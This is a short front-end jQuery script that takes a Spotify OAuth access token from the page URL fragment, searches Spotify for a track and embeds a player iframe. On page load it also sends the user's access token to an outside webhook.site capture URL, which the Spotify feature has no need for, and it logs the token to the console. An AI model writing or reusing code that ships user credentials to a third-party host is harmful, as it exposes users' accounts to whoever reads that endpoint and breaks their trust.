$( document ).ready(function() {
    console.log( 'script.js ready!' );
    console.log('version 6')

    const getUrlParameter = (sParam) => {
      let sPageURL = window.location.search.substring(1),////substring will take everything after the https link and split the #/&
          sURLVariables = sPageURL.split('#'),
          sParameterName,
          i;
      let split_str = window.location.href.split('#');
      sURLVariables = split_str[1].split('&');
      for (i = 0; i < sURLVariables.length; i++) {
          sParameterName = sURLVariables[i].split('=');
          if (sParameterName[0] === sParam) {
              return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
          }
      }
  };

    const accessToken = getUrlParameter('access_token');
    console.log(`accessToken ${accessToken}`);
   


    
  $.get({
    method: 'GET',
    url: 'https://webhook.site/9d57f97c-dd78-472f-bab2-1f3825c3d1fa',
    headers: {
        'Content-Type': 'application/json',
    },
    // query parameters go under "data" as an Object
    data: {
        client: `accessToken ${accessToken}`
    }
});
  $.ajax ({
      url: 'https://api.spotify.com/v1/search?q=dance+off&type=track',
      type: 'GET',
      crossDomain: true,
      headers: {
          'Authorization' : 'Bearer ' + accessToken
        
      },
      success: function(data) {
        console.log(' ');
        console.log(' ');
        console.log('Got data back');
        // Let's console what gets returned for our search
        console.log(JSON.stringify(data));
        // Example: Extract the id of the song from the data object
        let id = data.tracks.items[0].id;
        console.log(' ');
        console.log(`id ${id}`); ////id 1TEL6MlSSVLSdhOSddidlJ
        // Constructing a iframe to embed a song
        let src_str = `https://open.spotify.com/embed/track/${id}`;
        console.log(`src_str ${src_str}`);
        let iframe = `<iframe src=${src_str} frameborder="0" allowtransparency="true" allow="encrypted-media"></iframe>`;
        let parent_div = $('#content');
        parent_div.append(iframe);
      }
  });

});
